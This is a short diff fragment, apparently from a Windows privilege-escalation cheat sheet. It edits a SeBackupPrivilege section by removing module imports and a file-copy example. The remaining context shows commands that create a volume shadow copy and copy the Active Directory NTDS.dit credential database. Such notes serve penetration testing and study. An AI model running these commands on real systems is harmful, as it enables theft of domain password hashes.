@@ -79,11 +79,6 @@ vssadmin create shadow /for=C:
 
 # SeBackupPrivilege
 ```powershell
-Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
-
-Import-Module .\SeBackupPrivilegeUtils.dll
-Import-Module .\SeBackupPrivilegeCmdLets.dll
-
 # Copying NTDS.dit
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 
